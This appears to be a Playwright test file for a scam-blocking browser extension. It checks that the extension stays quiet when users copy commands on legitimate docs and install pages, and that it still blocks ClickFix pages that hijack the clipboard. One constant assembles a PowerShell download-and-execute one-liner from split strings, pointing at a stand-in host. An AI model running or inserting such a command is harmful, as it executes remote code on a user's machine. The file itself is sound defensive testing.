// tests/e2e/quiet-toasts.spec.js — 0.15.0 Task 6: copying a command yourself never warns or
// overwrites the clipboard, shop findings never change the verdict, and a ClickFix page that
// writes something the visitor never selected is still blocked.
const { test, BASE_HTTPS } = require('./fixtures');
const { expect } = require('@playwright/test');

const BASE = 'http://localhost:5599';
const PAYLOAD = ['ir', 'm https://example.test/install', '.ps1 | ie', 'x'].join('');

async function verdictFor(sw, urlPart) {
  const tabs = await sw.evaluate(() => chrome.tabs.query({}));
  const tab = tabs.filter((t) => (t.url || '').includes(urlPart)).pop();
  expect(tab, `no tab for ${urlPart}`).toBeTruthy();
  return sw.evaluate((id) => chrome.storage.session.get('verdict:' + id).then((s) => s['verdict:' + id]), tab.id);
}
async function expectNoSurface(page) {
  for (const sel of ['.scamshield-banner', '.scamshield-overlay', '.scamshield-interstitial', '.scamshield-toast']) {
    await expect(page.locator(sel)).toHaveCount(0);
  }
}

test('a docs page: clicking Copy next to the <pre> copies exactly that text - no toast, no interstitial, clipboard untouched', async ({ context }) => {
  const page = await context.newPage();
  await context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: 'https://localhost:5600' });
  await page.goto(`${BASE_HTTPS}/hard-benign/powershell-docs.html`);
  await page.bringToFront();
  await expect(page.locator('#cmd')).toHaveText(PAYLOAD);
  await page.waitForTimeout(2500); // initial scan settles
  await page.click('#copy');
  await expect(page.locator('#done')).toHaveText('Copied');
  await page.waitForTimeout(2000);
  await expectNoSurface(page);
  // ScamShield did not overwrite the clipboard with its "Blocked by ScamShield" notice.
  const clip = await page.evaluate(() => navigator.clipboard.readText().catch(() => null));
  if (clip !== null) expect(clip).toBe(PAYLOAD);
});

test('a docs page: selecting the command text by hand and pressing the Copy button is also silent', async ({ context }) => {
  const page = await context.newPage();
  await page.goto(`${BASE_HTTPS}/hard-benign/powershell-docs.html`);
  await page.bringToFront();
  await page.waitForTimeout(2000);
  await page.evaluate(() => { const r = document.createRange(); r.selectNodeContents(document.getElementById('cmd')); const s = getSelection(); s.removeAllRanges(); s.addRange(r); });
  await page.click('#copy');
  await page.waitForTimeout(1500);
  await expectNoSurface(page);
});

test('canary: a ClickFix page whose click writes a command the visitor never selected still blocks', async ({ context }) => {
  const page = await context.newPage();
  await page.goto(BASE + '/clipboard-clickfix.html');
  await page.bringToFront();
  await page.waitForTimeout(1500);
  await page.click('#c');
  await expect(page.locator('.scamshield-interstitial')).toBeVisible({ timeout: 8000 });
});

test('a shop that accepts bank transfer and lists opening hours: no banner (the popup shop card may list it)', async ({ context }) => {
  const sw = context.serviceWorkers()[0];
  const page = await context.newPage();
  await page.goto(`${BASE_HTTPS}/hard-benign/shop-bank-transfer.html`);
  await page.waitForTimeout(4000);
  await expectNoSurface(page);
  const v = await verdictFor(sw, 'shop-bank-transfer.html');
  expect(!v || v.level === 'safe', `verdict ${v && v.level}: ${JSON.stringify(v && v.reasonCodes)}`).toBe(true);
});

test('shop findings never raise the verdict even when the shop is genuinely risky', async ({ context }) => {
  const sw = context.serviceWorkers()[0];
  const page = await context.newPage();
  await page.goto(BASE + '/fake-shop.html');
  await page.waitForTimeout(3000);
  await expect(page.locator('.scamshield-banner')).toHaveCount(0);
  const v = await verdictFor(sw, 'fake-shop.html');
  expect(!v || v.level === 'safe', `verdict ${v && v.level}`).toBe(true);
});

test('canary: a VISIBLE command box + Copy under a Win+R / verify-you-are-human lure still blocks', async ({ context }) => {
  const page = await context.newPage();
  await page.goto(BASE + '/clipboard-clickfix-visible.html');
  await page.bringToFront();
  await page.waitForTimeout(2500);
  await expect(page.locator('.scamshield-interstitial')).toHaveCount(0); // the block comes from the copy, not the load
  await page.click('#copy');
  await expect(page.locator('.scamshield-interstitial')).toBeVisible({ timeout: 8000 });
});

test('canary: a payload that matches a transparent <pre> (and a programmatic selection of it) is not the user\'s own copy', async ({ context }) => {
  const page = await context.newPage();
  await page.goto(BASE + '/clipboard-clickfix-hiddenpre.html');
  await page.bringToFront();
  await page.waitForTimeout(1500);
  await page.click('#c');
  await expect(page.locator('.scamshield-interstitial')).toBeVisible({ timeout: 8000 });
});

test('canary: a transparent <textarea> laid over the button holds the payload - the click does not make it the user\'s copy', async ({ context }) => {
  const page = await context.newPage();
  await page.goto(BASE + '/clipboard-clickfix-overlay.html');
  await page.bringToFront();
  await page.waitForTimeout(1500);
  await page.locator('#c').click({ force: true });
  await expect(page.locator('.scamshield-interstitial')).toBeVisible({ timeout: 8000 });
});

test('canary: a selection from a visible empty node to the end of a transparent <pre> is not trusted', async ({ context }) => {
  const page = await context.newPage();
  await page.goto(BASE + '/clipboard-clickfix-range.html');
  await page.bringToFront();
  await page.waitForTimeout(1500);
  await page.click('#c');
  await expect(page.locator('.scamshield-interstitial')).toBeVisible({ timeout: 8000 });
});

test('install docs ("Paste the following into PowerShell and press Enter" + visible <pre> + Copy) stay silent', async ({ context }) => {
  const page = await context.newPage();
  await page.goto(`${BASE_HTTPS}/hard-benign/scoop-install.html`);
  await page.bringToFront();
  await page.waitForTimeout(2500);
  await page.click('#copy');
  await expect(page.locator('#done')).toHaveText('Copied');
  await page.waitForTimeout(2000);
  await expectNoSurface(page);
});
